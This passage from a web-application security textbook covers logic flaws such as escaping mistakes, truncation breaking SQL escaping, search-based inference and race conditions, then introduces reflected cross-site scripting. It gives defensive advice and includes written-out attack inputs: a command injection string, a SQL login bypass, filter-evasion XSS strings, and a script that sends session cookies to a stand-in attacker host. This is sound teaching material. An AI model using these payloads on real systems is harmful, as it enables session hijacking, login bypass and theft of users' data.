The application applies the relevant escaping, as described previously, so the 
attacker‚Äôs input becomes:
foo\\;ls
When this data is passed as an argument to the operating system command, 
the shell interpreter treats the fi rst backslash as the escape character. Therefore, 
it treats the second backslash as a literal backslash‚Äînot as an escape character, 
but as part of the argument itself. It then encounters a semicolon that is apparently not escaped. It treats this as a command separator and therefore goes on 
to execute the injected command supplied by the attacker.
c11.indd 419 c11.indd 419 8/19/2011 12:11:45 PM 8/19/2011 12:11:45 PM
Stuttard c11.indd V2 - 07/26/2011 Page 420
420 Chapter 11 n Attacking Application Logic
HACK STEPS
Whenever you probe an application for command injection and other fl aws, 
having attempted to insert the relevant metacharacters into the data you control, always try placing a backslash immediately before each such character to 
test for the logic fl aw just described.
NOTE This same fl aw can be found in some defenses against cross-site 
scripting attacks (see Chapter 12). When user-supplied input is copied directly 
into the value of a string variable in a piece of JavaScript, this value is encapsulated within quotation marks. To defend themselves against cross-site 
scripting, many applications use backslashes to escape any quotation marks 
that appear within the user‚Äôs input. However, if the backslash character itself 
is not escaped, an attacker can submit \‚Äô to break out of the string and therefore take control of the script. This exact bug was found in early versions of 
the Ruby On Rails framework in the escape_javascript function.
Example 9: Invalidating Input Validation
The authors encountered this logic fl aw in a web application used in an e-commerce site. Variants can be found in many other applications.
The Functionality
The application contained a suite of input validation routines to protect against 
various types of attacks. Two of these defense mechanisms were a SQL injection 
fi lter and a length limiter.
It is common for applications to try to defend themselves against SQL injection by escaping any single quotation marks that appear within string-based 
user input (and rejecting any that appear within numeric input). As described 
in Chapter 9, two single quotation marks together are an escape sequence that 
represents one literal single quote, which the database interprets as data within a 
quoted string rather than the closing string terminator. Many developers reason, 
therefore, that by doubling any single quotation marks within user-supplied 
input, they will prevent any SQL injection attacks from occurring.
The length limiter was applied to all input, ensuring that no variable supplied by a user was longer than 128 characters. It achieved this by truncating 
any variables to 128 characters.
The Assumption
It was assumed that both the SQL injection fi lter and length truncation were 
desirable defenses from a security standpoint, so both should be applied.
c11.indd 420 c11.indd 420 8/19/2011 12:11:45 PM 8/19/2011 12:11:45 PM
20 Stuttard c11.indd V2 - 07/26/2011 Page 421
 Chapter 11 n Attacking Application Logic 421
The Attack
The SQL injection defense works by doubling any quotation marks appearing 
within user input, so that within each pair of quotes, the fi rst quote acts as an 
escape character to the second. However, the developers did not consider what 
would happen to the sanitized input if it was then handed to the truncation 
function.
Recall the SQL injection example in a login function in Chapter 9. Suppose 
that the application doubles any single quotation marks contained in user input 
and also then imposes a length limit on the data, truncating it to 128 characters. 
Supplying this username:
admin‚Äô--
now results in the following query, which fails to bypass the login:
SELECT * FROM users WHERE username = ‚Äòadmin‚Äô‚Äô--‚Äô and password = ‚Äò‚Äô
However, if you submit a following username (containing 127 a‚Äôs followed 
by a single quotation mark):
aaaaaaaa[...]aaaaaaaaaaa‚Äô
the application fi rst doubles up the single quotation mark and then truncates the 
string to 128 characters, returning your input to its original value. This results 
in a database error, because you have injected an additional single quotation 
mark into the query without fi xing the surrounding syntax. If you now also 
supply the password:
or 1=1--
the application performs the following query, which succeeds in bypassing the 
login:
SELECT * FROM users WHERE username = ‚Äòaaaaaaaa[...]aaaaaaaaaaa‚Äô‚Äô and
 password = ‚Äòor 1=1--‚Äô
The doubled quotation mark at the end of the string of a‚Äôs is interpreted 
as an escaped quotation mark and, therefore, as part of the query data. This 
string effectively continues as far as the next single quotation mark, which 
in the original query marked the start of the user-supplied password value. 
Thus, the actual username that the database understands is the literal string 
data shown here:
aaaaaaaa[...]aaaaaaaaaaa‚Äôand password =
Hence, whatever comes next is interpreted as part of the query itself and can 
be crafted to interfere with the query logic.
c11.indd 421 c11.indd 421 8/19/2011 12:11:45 PM 8/19/2011 12:11:45 PM
Stuttard c11.indd V2 - 07/26/2011 Page 422
422 Chapter 11 n Attacking Application Logic
TIP You can test for this type of vulnerability without knowing exactly what 
length limit is being imposed by submitting in turn two long strings of the following form:
‚Äò‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô and so on
a‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô‚Äô and so on 
and determining whether an error occurs. Any truncation of escaped input will 
occur after either an even or odd number of characters. Whichever possibility 
is the case, one of the preceding strings will result in an odd number of single 
quotation marks being inserted into the query, resulting in invalid syntax.
HACK STEPS
Make a note of any instances in which the application modifi es user input, in 
particular by truncating it, stripping out data, encoding, or decoding. For any 
observed instances, determine whether a malicious string can be contrived:
 1. If data is stripped once (nonrecursively), determine whether you can 
submit a string that compensates for this. For example, if the application 
filters SQL keywords such as SELECT, submit SELSELECTECT and see if 
the resulting filtering removes the inner SELECT substring, leaving the 
word SELECT.
 2. If data validation takes place in a set order and one or more validation 
processes modifies the data, determine whether this can be used to beat 
one of the prior validation steps. For example, if the application performs 
URL decoding and then strips malicious data such as the <script> tag, it 
may be possible to overcome this with strings such as:
%<script>3cscript%<script>3ealert(1)%<script>3c/
script%<script>3e
NOTE Cross-site scripting fi lters frequently inadvisably strip all data that 
occurs between HTML tag pairs, such as <tag1>aaaaa</tag1>. These are 
often vulnerable to this type of attack.
Example 10: Abusing a Search Function
The authors encountered this logic fl aw in an application providing subscriptionbased access to fi nancial news and information. The same vulnerability was 
later found in two completely unrelated applications, illustrating the subtle and 
pervasive nature of many logic fl aws.
c11.indd 422 c11.indd 422 8/19/2011 12:11:45 PM 8/19/2011 12:11:45 PM
22 Stuttard c11.indd V2 - 07/26/2011 Page 423
 Chapter 11 n Attacking Application Logic 423
The Functionality
The application provided access to a huge archive of historical and current 
information, including company reports and accounts, press releases, market 
analyses, and the like. Most of this information was accessible only to paying 
subscribers.
The application provided a powerful and fi ne-grained search function that 
all users could access. When an anonymous user performed a query, the search 
function returned links to all documents that matched the query. However, the 
user was required to subscribe to retrieve any of the actual protected documents 
his query returned. The application‚Äôs owners regarded this behavior as a useful 
marketing tactic.
The Assumption
The application‚Äôs designer assumed that users could not use the search function 
to extract any useful information without paying for it. The document titles 
listed in the search results were typically cryptic, such as ‚ÄúAnnual Results 2010,‚Äù 
‚ÄúPress Release 08-03-2011,‚Äù and so on.
The Attack
Because the search function indicated how many documents matched a given 
query, a wily user could issue a large number of queries and use inference to 
extract information from the search function that normally would need to be 
paid for. For example, the following queries could be used to zero in on the 
contents of an individual protected document:
wahh consulting
>> 276 matches
wahh consulting ‚ÄúPress Release 08-03-2011‚Äù merger
>> 0 matches
wahh consulting ‚ÄúPress Release 08-03-2011‚Äù share issue
>> 0 matches
wahh consulting ‚ÄúPress Release 08-03-2011‚Äù dividend
>> 0 matches
wahh consulting ‚ÄúPress Release 08-03-2011‚Äù takeover
>> 1 match
wahh consulting ‚ÄúPress Release 08-03-2011‚Äù takeover haxors inc
>> 0 matches
wahh consulting ‚ÄúPress Release 08-03-2011‚Äù takeover uberleet ltd
>> 0 matches
wahh consulting ‚ÄúPress Release 08-03-2011‚Äù takeover script kiddy corp
>> 0 matches
wahh consulting ‚ÄúPress Release 08-03-2011‚Äù takeover ngs
>> 1 match
c11.indd 423 c11.indd 423 8/19/2011 12:11:46 PM 8/19/2011 12:11:46 PM
Stuttard c11.indd V2 - 07/26/2011 Page 424
424 Chapter 11 n Attacking Application Logic
wahh consulting ‚ÄúPress Release 08-03-2011‚Äù takeover ngs announced
>> 0 matches
wahh consulting ‚ÄúPress Release 08-03-2011‚Äù takeover ngs cancelled
>> 0 matches
wahh consulting ‚ÄúPress Release 08-03-2011‚Äù takeover ngs completed
>> 1 match
Although the user cannot view the document itself, with suffi cient imagination and use of scripted requests, he may be able to build a fairly accurate 
understanding of its contents.
TIP In certain situations, being able to leach information via a search 
function in this way may be critical to the security of the application itself, 
effectively disclosing details of administrative functions, passwords, and technologies in use.
TIP This technique has proven to be an effective attack against internal 
document man agement software. The authors have used this technique to 
brute-force a key password from a confi guration fi le that was stored in a wiki. 
Because the wiki returned a hit if the search string appeared anywhere in the 
page (instead of matching on whole words), it was possible to brute-force the 
password letter by letter, searching for the following:
Password=A
Password=B
Password=BA
...
Example 11: Snarfi ng Debug Messages
The authors encountered this logic fl aw in a web application used by a fi nancial 
services company.
The Functionality
The application was only recently deployed. Like much new software, it still contained a number of functionality-related bugs. Intermittently, various operations 
would fail in an unpredictable way, and users would receive an error message.
To facilitate the investigation of errors, developers decided to include detailed, 
verbose information in these messages, including the following details:
n The user‚Äôs identity
n The token for the current session
n The URL being accessed
n All the parameters supplied with the request that generated the error
c11.indd 424 c11.indd 424 8/19/2011 12:11:46 PM 8/19/2011 12:11:46 PM
24 Stuttard c11.indd V2 - 07/26/2011 Page 425
 Chapter 11 n Attacking Application Logic 425
Generating these messages had proven useful when help desk personnel 
attempted to investigate and recover from system failures. They also were helping iron out the remaining functionality bugs.
The Assumption
Despite the usual warnings from security advisers that verbose debug messages 
of this kind could potentially be misused by an attacker, the developers reasoned 
that they were not opening any security vulnerability. The user could readily 
obtain all the information contained in the debugging message by inspecting 
the requests and responses processed by her browser. The messages did not 
include any details about the actual failure, such as stack traces, so conceivably 
they were not helpful in formulating an attack against the application.
The Attack
Despite their reasoning about the contents of the debug messages, the developers‚Äô assumption was fl awed because of mistakes they made in implementing 
the creation of debugging messages.
When an error occurred, a component of the application gathered all the 
required information and stored it. The user was issued an HTTP redirect to a 
URL that displayed this stored information. The problem was that the application‚Äôs storage of debug information, and user access to the error message, was 
not session-based. Rather, the debugging information was stored in a static 
container, and the error message URL always displayed the information that was 
last placed in this container. Developers had assumed that users following the 
redirect would therefore see only the debug information relating to their error.
In fact, in this situation, ordinary users would occasionally be presented with 
the debugging information relating to a different user‚Äôs error, because the two 
errors had occurred almost simultaneously. But aside from questions about 
thread safety (see the next example), this was not simply a race condition. An 
attacker who discovered how the error mechanism functioned could simply 
poll the message URL repeatedly and log the results each time they changed. 
Over a period of few hours, this log would contain sensitive data about numerous application users:
n A set of usernames that could be used in a password-guessing attack
n A set of session tokens that could be used to hijack sessions
n A set of user-supplied input, which may contain passwords and other 
sensitive items
The error mechanism, therefore, presented a critical security threat. Because 
administrative users sometimes received these detailed error messages, an 
c11.indd 425 c11.indd 425 8/19/2011 12:11:46 PM 8/19/2011 12:11:46 PM
Stuttard c11.indd V2 - 07/26/2011 Page 426
426 Chapter 11 n Attacking Application Logic
attacker monitoring error messages would soon obtain suffi cient information 
to compromise the entire application.
HACK STEPS
 1. To detect a flaw of this kind, first catalog all the anomalous events and 
conditions that can be generated and that involve interesting user-specific 
information being returned to the browser in an unusual way, such as a 
debugging error message.
 2. Using the application as two users in parallel, systematically engineer 
each condition using one or both users, and determine whether the other 
user is affected in each case.
Example 12: Racing Against the Login
This logic fl aw has affected several major applications in the recent past.
The Functionality
The application implemented a robust, multistage login process in which users 
were required to supply several different credentials to gain access.
The Assumption
The authentication mechanism had been subject to numerous design reviews 
and penetration tests. The owners were confi dent that no feasible means existed 
of attacking the mechanism to gain unauthorized access.
The Attack
In fact, the authentication mechanism contained a subtle fl aw. Occasionally, 
when a customer logged in, he gained access to the account of a completely 
different user, enabling him to view all that user‚Äôs fi nancial details, and even 
make payments from the other user‚Äôs account. The application‚Äôs behavior initially appeared to be random: the user had not performed any unusual action to 
gain unauthorized access, and the anomaly did not recur on subsequent logins.
After some investigation, the bank discovered that the error was occurring when 
two different users logged in to the application at precisely the same moment. It 
did not occur on every such occasion‚Äîonly on a subset of them. The root cause 
was that the application was briefl y storing a key identifi er about each newly 
authenticated user within a static (nonsession) variable. After being written, this 
variable‚Äôs value was read back an instant later. If a different thread (processing 
another login) had written to the variable during this instant, the earlier user 
would land in an authenticated session belonging to the subsequent user.
c11.indd 426 c11.indd 426 8/19/2011 12:11:46 PM 8/19/2011 12:11:46 PM
26 Stuttard c11.indd V2 - 07/26/2011 Page 427
 Chapter 11 n Attacking Application Logic 427
The vulnerability arose from the same kind of mistake as in the error message 
example described previously: the application was using static storage to hold 
information that should have been stored on a per-thread or per-session basis. 
However, the present example is far more subtle to detect and is more diffi cult 
to exploit because it cannot be reliably reproduced.
Flaws of this kind are known as ‚Äúrace conditions‚Äù because they involve a 
vulnerability that arises for a brief period of time under certain specifi c circumstances. Because the vulnerability exists only for a short time, an attacker ‚Äúraces‚Äù 
to exploit it before the application closes it again. In cases where the attacker is 
local to the application, it is often possible to engineer the exact circumstances 
under which the race condition arises and reliably exploit the vulnerability 
during the available window. Where the attacker is remote to the application, 
this is normally much harder to achieve.
A remote attacker who understood the nature of the vulnerability could 
conceivably have devised an attack to exploit it by using a script to log in continuously and check the details of the account accessed. But the tiny window 
during which the vulnerability could be exploited meant that a huge number 
of requests would be required.
It was not surprising that the race condition was not discovered during normal 
penetration testing. The conditions in which it arose came about only when the 
application gained a large-enough user base for random anomalies to occur, which 
were reported by customers. However, a close code review of the authentication 
and session management logic would have identifi ed the problem.
HACK STEPS
Performing remote black-box testing for subtle thread safety issues of this 
kind is not straightforward. It should be regarded as a specialized undertaking, probably necessary only in the most security-critical of applications.
 1. Target selected items of key functionality, such as login mechanisms, 
password change functions, and funds transfer processes.
 2. For each function tested, identify a single request, or a small number 
of requests, that a given user can use to perform a single action. Also 
find the simplest means of confirming the result of the action, such as 
verifying that a given user‚Äôs login has resulted in access to that person‚Äôs 
account information.
 3. Using several high-spec machines, accessing the application from different network locations, script an attack to perform the same action repeatedly on behalf of several different users. Confirm whether each action has 
the expected result.
 4. Be prepared for a large volume of false positives. Depending on the 
scale of the application‚Äôs supporting infrastructure, this activity may well 
amount to a load test of the installation. Anomalies may be experienced 
for reasons that have nothing to do with security.
c11.indd 427 c11.indd 427 8/19/2011 12:11:46 PM 8/19/2011 12:11:46 PM
Stuttard c11.indd V2 - 07/26/2011 Page 428
428 Chapter 11 n Attacking Application Logic
Avoiding Logic Flaws
Just as there is no unique signature by which logic fl aws in web applications 
can be identifi ed, there is also no silver bullet that will protect you. For example, 
there is no equivalent to the straightforward advice of using a safe alternative 
to a dangerous API. Nevertheless, a range of good practices can be applied to 
signifi cantly reduce the risk of logical fl aws appearing within your applications:
n Ensure that every aspect of the application‚Äôs design is clearly documented 
in suffi cient detail for an outsider to understand every assumption the 
designer made. All such assumptions should be explicitly recorded within 
the design documentation.
n Mandate that all source code is clearly commented to include the following information throughout:
n The purpose and intended uses of each code component.
n The assumptions made by each component about anything that is 
outside of its direct control.
n References to all client code that uses the component. Clear documentation to this effect could have prevented the logic fl aw within the online 
registration functionality. (Note that ‚Äúclient‚Äù here refers not to the user 
end of the client/server relationship but to other code for which the 
component being considered is an immediate dependency.)
n During security-focused reviews of the application design, refl ect on every 
assumption made within the design, and try to imagine circumstances 
under which each assumption might be violated. Focus on any assumed 
conditions that could conceivably be within the control of application users.
n During security-focused code reviews, think laterally about two key areas: 
the ways in which the application will handle unexpected user behavior, 
and the potential side effects of any dependencies and interoperation 
between different code components and different application functions.
In relation to the specifi c examples of logic fl aws we have described, a number 
of individual lessons can be learned:
n Be constantly aware that users control every aspect of every request (see 
Chapter 1). They may access multistage functions in any sequence. They 
may submit parameters that the application did not ask for. They may 
omit certain parameters, not just interfere with the parameters‚Äô values.
n Drive all decisions regarding a user‚Äôs identity and status from her session (see 
Chapter 8). Do not make any assumptions about the user‚Äôs privileges on the 
basis of any other feature of the request, including the fact that it occurs at all.
c11.indd 428 c11.indd 428 8/19/2011 12:11:46 PM 8/19/2011 12:11:46 PM
28 Stuttard c11.indd V2 - 07/26/2011 Page 429
 Chapter 11 n Attacking Application Logic 429
n When implementing functions that update session data on the basis of 
input received from the user, or actions performed by the user, carefully 
consider any impact that the updated data may have on other functionality 
within the application. Be aware that unexpected side effects may occur 
in entirely unrelated functionality written by a different programmer or 
even a different development team.
n If a search function is liable to index sensitive data that some users are 
not authorized to access, ensure that the function does not provide any 
means for those users to infer information based on search results. If 
appropriate, maintain several search indexes based on different levels of 
user privilege, or perform dynamic searches of information repositories 
with the privileges of the requesting user.
n Be extremely wary of implementing any functionality that enables any 
user to delete items from an audit trail. Also, consider the possible impact 
of a high-privileged user creating another user of the same privilege level 
in heavily audited applications and dual-authorization models.
n When carrying out checks based on numeric business limits and thresholds, perform strict canonicalization and data validation on all user input 
before processing it. If negative numbers are not expected, explicitly reject 
requests that contain them.
n When implementing discounts based on order volumes, ensure that orders 
are fi nalized before actually applying the discount.
n When escaping user-supplied data before passing to a potentially vulnerable application component, always be sure to escape the escape character 
itself, or the entire validation mechanism may be broken.
n Always use appropriate storage to maintain any data that relates to an 
individual user‚Äîeither in the session or in the user‚Äôs profi le.
Summary
Attacking an application‚Äôs logic involves a mixture of systematic probing and 
lateral thinking. We have described various key checks that you should always 
carry out to test the application‚Äôs behavior in response to unexpected input. 
These include removing parameters from requests, using forced browsing to 
access functions out of sequence, and submitting parameters to different locations within the application. Often, how an application responds to these actions 
points toward some defective assumption that you can violate, to malicious effect.
In addition to these basic tests, the most important challenge when probing 
for logic fl aws is to try to get inside the developers‚Äô minds. You need to understand what they were trying to achieve, what assumptions they probably made, 
c11.indd 429 c11.indd 429 8/19/2011 12:11:46 PM 8/19/2011 12:11:46 PM
Stuttard c11.indd V2 - 07/26/2011 Page 430
430 Chapter 11 n Attacking Application Logic
what shortcuts they probably took, and what mistakes they may have made. 
Imagine that you were working on a tight deadline, worrying primarily about 
functionality rather than security, trying to add a new function to an existing 
code base, or using poorly documented APIs written by someone else. In that 
situation, what would you get wrong, and how could it be exploited?
Questions
Answers can be found at http://mdsec.net/wahh.
 1. What is forced browsing, and what kinds of vulnerabilities can it be used 
to identify?
 2. An application applies various global fi lters on user input, designed to 
prevent different categories of attack. To defend against SQL injection, 
it doubles up any single quotation marks that appear in user input. To 
prevent buffer overfl ow attacks against some native code components, it 
truncates any overlong items to a reasonable limit.
What might go wrong with these fi lters?
 3. What steps could you take to probe a login function for fail-open conditions? (Describe as many different tests as you can think of.)
 4. A banking application implements a multistage login mechanism that is 
intended to be highly robust. At the fi rst stage, the user enters a username 
and password. At the second stage, the user enters the changing value on 
a physical token she possesses, and the original username is resubmitted 
in a hidden form fi eld.
What logic fl aw should you immediately check for?
 5. You are probing an application for common categories of vulnerability 
by submitting crafted input. Frequently, the application returns verbose 
error messages containing debugging information. Occasionally, these 
messages relate to errors generated by other users. When this happens, 
you are unable to reproduce the behavior a second time. What logic fl aw 
might this indicate, and how should you proceed?
c11.indd 430 c11.indd 430 8/19/2011 12:11:46 PM 8/19/2011 12:11:46 PM
Stuttard c12.indd V2 - 08/10/2011 Page 431
431
C H A P T E R 
12
Attacking Users: 
Cross-Site Scripting
All the attacks we have considered so far involve directly targeting the serverside application. Many of these attacks do, of course, impinge upon other users, 
such as a SQL injection attack that steals other users‚Äô data. But the attacker‚Äôs 
essential methodology was to interact with the server in unexpected ways to 
perform unauthorized actions and access unauthorized data.
The attacks described in this chapter and the next are in a different category, 
because the attacker‚Äôs primary target is the application‚Äôs other users. All the 
relevant vulnerabilities still exist within the application itself. However, the 
attacker leverages some aspect of the application‚Äôs behavior to carry out malicious 
actions against another end user. These actions may result in some of the same 
effects that we have already examined, such as session hijacking, unauthorized actions, and the disclosure of personal data. They may also result in other 
undesirable outcomes, such as logging of keystrokes or execution of arbitrary 
commands on users‚Äô computers.
Other areas of software security have witnessed a gradual shift in focus from 
server-side to client-side attacks in recent years. For example, Microsoft used 
to frequently announce serious security vulnerabilities within its server products. Although numerous client-side fl aws were also disclosed, these received 
much less attention because servers presented a much more appealing target 
for most attackers. In the course of just a few years, at the start of the twentyfi rst century, this situation has changed markedly. At the time of this writing, 
c12.indd 431 c12.indd 431 8/19/2011 12:12:25 PM 8/19/2011 12:12:25 PM
Stuttard c12.indd V2 - 08/10/2011 Page 432
432 Chapter 12 n Attacking Users: Cross-Site Scripting 
no critical security vulnerabilities have been publicly announced in Microsoft‚Äôs 
IIS web server from version 6 onward. However, in the time since this product 
was fi rst released, a large number of fl aws have been disclosed in Microsoft‚Äôs 
Internet Explorer browser. As general awareness of security threats has evolved, 
the front line of the battle between application owners and hackers has moved 
from the server to the client.
Although the development of web application security has been a few years 
behind the curve, the same trend can be identifi ed. At the end of the 1990s, most 
applications on the Internet were riddled with critical fl aws such as command 
injection, which could be easily found and exploited by any attacker with a bit 
of knowledge. Although many such vulnerabilities still exist today, they are 
slowly becoming less widespread and more diffi cult to exploit. Meanwhile, even 
the most security-critical applications still contain many easily discoverable 
client-side fl aws. Furthermore, although the server side of an application may 
behave in a limited, controllable manner, clients may use any number of different browser technologies and versions, opening a wide range of potentially 
successful attack vectors.
A key focus of research in the past decade has been client-side vulnerabilities, 
with defects such as session fi xation and cross-site request forgery fi rst being 
discussed many years after most categories of server-side bugs were widely 
known. Media focus on web security is predominantly concerned with clientside attacks, with such terms as spyware, phishing, and Trojans being common 
currency to many journalists who have never heard of SQL injection or path 
traversal. And attacks against web application users are an increasingly lucrative criminal business. Why go to the trouble of breaking into an Internet bank 
when you can instead compromise 1% of its 10 million customers in a relatively 
crude attack that requires little skill or elegance?
Attacks against other application users come in many forms and manifest a 
variety of subtleties and nuances that are frequently overlooked. They are also 
less well understood in general than the primary server-side attacks, with different fl aws being confl ated or neglected even by some seasoned penetration 
testers. We will describe all the different vulnerabilities that are commonly 
encountered and spell out the practical steps you need to follow to identify and 
exploit each of these.
This chapter focuses on cross-site scripting (XSS). This category of vulnerability is the Godfather of attacks against other users. It is by some measure the 
most prevalent web application vulnerability found in the wild. It affl icts the 
vast majority of live applications, including some of the most security-critical 
applications on the Internet, such as those used by online banks. The next 
chapter examines a large number of other types of attacks against users, some 
of which have important similarities to XSS.
c12.indd 432 c12.indd 432 8/19/2011 12:12:26 PM 8/19/2011 12:12:26 PM
Stuttard c12.indd V2 - 08/10/2011 Page 433
 Chapter 12 n Attacking Users: Cross-Site Scripting 433
COMMON MYTH
‚ÄúUsers get compromised because they are not security-conscious‚Äù.
Although this is partially true, some attacks against application users can 
be successful regardless of the users‚Äô security precautions. Stored XSS attacks 
can compromise the most security-conscious users without any interaction 
from the user. Chapter 13 introduces many more methods by which securityconscious users can be compromised without their knowledge.
When XSS was fi rst becoming widely known in the web application security 
community, some professional penetration testers were inclined to regard XSS 
as a ‚Äúlame‚Äù vulnerability. This was partly due to its phenomenal prevalence 
across the web, and also because XSS is often of less direct use to a lone hacker 
targeting an application, as compared with many vulnerabilities such as serverside command injection. Over time, this perception has changed, and today XSS 
is often cited as the number-one security threat on the web. As research into 
client-side attacks has developed, discussion has focused on numerous other 
attacks that are at least as convoluted to exploit as any XSS fl aw. And numerous 
real-world attacks have occurred in which XSS vulnerabilities have been used 
to compromise high-profi le organizations.
XSS often represents a critical security weakness within an application. It 
can often be combined with other vulnerabilities to devastating effect. In some 
situations, an XSS attack can be turned into a virus or self-propagating worm. 
Attacks of this kind are certainly not lame.
COMMON MYTH
‚ÄúYou can‚Äôt own a web application via XSS.‚Äù
The authors have owned numerous applications using only XSS attacks. In 
the right situation, a skillfully exploited XSS vulnerability can lead directly to a 
complete compromise of the application. We will show you how.
Varieties of XSS
XSS vulnerabilities come in various forms and may be divided into three varieties: refl ected, stored, and DOM-based. Although these have several features 
in common, they also have important differences in how they can be identifi ed 
and exploited. We will examine each variety of XSS in turn.
c12.indd 433 c12.indd 433 8/19/2011 12:12:26 PM 8/19/2011 12:12:26 PM
Stuttard c12.indd V2 - 08/10/2011 Page 434
434 Chapter 12 n Attacking Users: Cross-Site Scripting 
Refl ected XSS Vulnerabilities
A very common example of XSS occurs when an application employs a dynamic 
page to display error messages to users. Typically, the page takes a parameter 
containing the message‚Äôs text and simply renders this text back to the user within 
its response. This type of mechanism is convenient for developers, because it 
allows them to invoke a customized error page from anywhere in the application 
without needing to hard-code individual messages within the error page itself.
For example, consider the following URL, which returns the error message 
shown in Figure 12-1:
http://mdsec.net/error/5/Error.ashx?message=Sorry%2c+an+error+occurred
Figure 12-1: A dynamically generated error message
Looking at the HTML source for the returned page, we can see that the application simply copies the value of the message parameter in the URL and inserts 
it into the error page template at the appropriate place:
<p>Sorry, an error occurred.</p>
This behavior of taking user-supplied input and inserting it into the HTML 
of the server‚Äôs response is one of the signatures of refl ected XSS vulnerabilities, 
and if no fi ltering or sanitization is being performed, the application is certainly 
vulnerable. Let‚Äôs see how.
The following URL has been crafted to replace the error message with a piece 
of JavaScript that generates a pop-up dialog:
http://mdsec.net/error/5/Error.ashx?message=<script>alert(1)</script>
Requesting this URL generates an HTML page that contains the following 
in place of the original message:
<p><script>alert(1);</script></p>
c12.indd 434 c12.indd 434 8/19/2011 12:12:26 PM 8/19/2011 12:12:26 PM
Stuttard c12.indd V2 - 08/10/2011 Page 435
 Chapter 12 n Attacking Users: Cross-Site Scripting 435
Sure enough, when the page is rendered within the user‚Äôs browser, the popup message appears, as shown in Figure 12-2.
Figure 12-2: A proof-of-concept XSS exploit
Performing this simple test serves verifi es two important things. First, the 
contents of the message parameter can be replaced with arbitrary data that gets 
returned to the browser. Second, whatever processing the server-side application 
is performing on this data (if any), it is insuffi cient to prevent us from supplying JavaScript code that is executed when the page is displayed in the browser.
TRY IT!
http://mdsec.net/error/5/
NOTE If you try examples like this in Internet Explorer, the pop-up may fail to 
appear, and the browser may show the message ‚ÄúInternet Explorer has modifi ed this page to help prevent cross-site scripting.‚Äù This is because recent versions of Internet Explorer contain a built-in mechanism designed to protect 
users against refl ected XSS vulnerabilities. If you want to test these examples, 
you can try a different browser that does not use this protection, or you can disable the XSS fi lter by going to Tools √ø Internet Options √ø Security √ø Custom 
Level. Under Enable XSS fi lter, select Disable. We will describe how the XSS fi lter works, and ways in which it can be circumvented, later in this chapter.
This type of simple XSS bug accounts for approximately 75% of the XSS 
vulnerabilities that exist in real-world web applications. It is called refl ected
XSS because exploiting the vulnerability involves crafting a request containing 
embedded JavaScript that is refl ected to any user who makes the request. The 
attack payload is delivered and executed via a single request and response. For 
this reason, it is also sometimes called fi rst-order XSS.
c12.indd 435 c12.indd 435 8/19/2011 12:12:26 PM 8/19/2011 12:12:26 PM
Stuttard c12.indd V2 - 08/10/2011 Page 436
436 Chapter 12 n Attacking Users: Cross-Site Scripting 
Exploiting the Vulnerability
As you will see, XSS vulnerabilities can be exploited in many different ways 
to attack other users of an application. One of the simplest attacks, and the one 
that is most commonly envisaged to explain the potential signifi cance of XSS 
fl aws, results in the attacker‚Äôs capturing the session token of an authenticated 
user. Hijacking the user‚Äôs session gives the attacker access to all the data and 
functionality to which the user is authorized (see Chapter 7).
The steps involved in this attack are illustrated in Figure 12-3.
Figure 12-3: The steps involved in a reflected XSS attack
Application
2. Attacker feeds crafted URL to user
User Attacker
5. Attacker‚Äôs
JavaScript
executes in
user‚Äôs browser 6. User‚Äôs browser sends session token to attacker
3. User requests attacker‚Äôs URL
4. Server responds with
attacker‚Äôs JavaScript
1. User logs in
7. Attacker hijacks user‚Äôs session
 1. The user logs in to the application as normal and is issued a cookie 
containing a session token:
Set-Cookie: sessId=184a9138ed37374201a4c9672362f12459c2a652491a3
 2. Through some means (described in detail later), the attacker feeds the 
following URL to the user:
http://mdsec.net/error/5/Error.ashx?message=<script>var+i=new+Image
;+i.src=‚Äùhttp://mdattacker.net/‚Äù%2bdocument.cookie;</script>
As in the previous example, which generated a dialog message, this URL 
contains embedded JavaScript. However, the attack payload in this case 
is more malicious.
 3. The user requests from the application the URL fed to him by the attacker.
c12.indd 436 c12.indd 436 8/19/2011 12:12:26 PM 8/19/2011 12:12:26 PM
Stuttard c12.indd V2 - 08/10/2011 Page 437
 Chapter 12 n Attacking Users: Cross-Site Scripting 437
 4. The server responds to the user‚Äôs request. As a result of the XSS vulnerability, the response contains the JavaScript the attacker created.
 5. The user‚Äôs browser receives the attacker‚Äôs JavaScript and executes it in the 
same way it does any other code it receives from the application.
 6. The malicious JavaScript created by the attacker is:
var i=new Image; i.src=‚Äùhttp://mdattacker.net/‚Äù+document.cookie;
This code causes the user‚Äôs browser to make a request to mdattacker.net
which is a domain owned by the attacker. The request contains the user‚Äôs 
current session token for the application:
GET /sessId=184a9138ed37374201a4c9672362f12459c2a652491a3 HTTP/1.1
Host: mdattacker.net
 7. The attacker monitors requests to mdattacker.net and receives the user‚Äôs 
request. He uses the captured token to hijack the user‚Äôs session, gaining 
access to that user‚Äôs personal information and performing arbitrary actions 
‚Äúas‚Äù the user.
NOTE As you saw in Chapter 6, some applications store a persistent cookie 
that effectively reauthenticates the user on each visit, such as to implement a 
‚Äúremember me‚Äù function. In this situation, step 1 of the preceding process is 
unnecessary. The attack will succeed even when the target user is not actively 
logged in to or using the application. Because of this, applications that use 
cookies in this way leave themselves more exposed in terms of the impact of 
any XSS fl aws they contain.
After reading all this, you may be forgiven for wondering why, if the attacker 
can induce the user to visit a URL of his choosing, he bothers with the rigmarole of transmitting his malicious JavaScript via the XSS bug in the vulnerable 
application. Why doesn‚Äôt he simply host a malicious script on mdattacker.net
and feed the user a direct link to this script? Wouldn‚Äôt this script execute in the 
same way as it does in the example described?
To understand why the attacker needs to exploit the XSS vulnerability, recall 
the same-origin policy that was described in Chapter 3. Browsers segregate 
content that is received from different origins (domains) in an attempt to prevent 
different domains from interfering with each other within a user‚Äôs browser. 
The attacker‚Äôs objective is not simply to execute an arbitrary script but to capture the user‚Äôs session token. Browsers do not let just any old script access a 
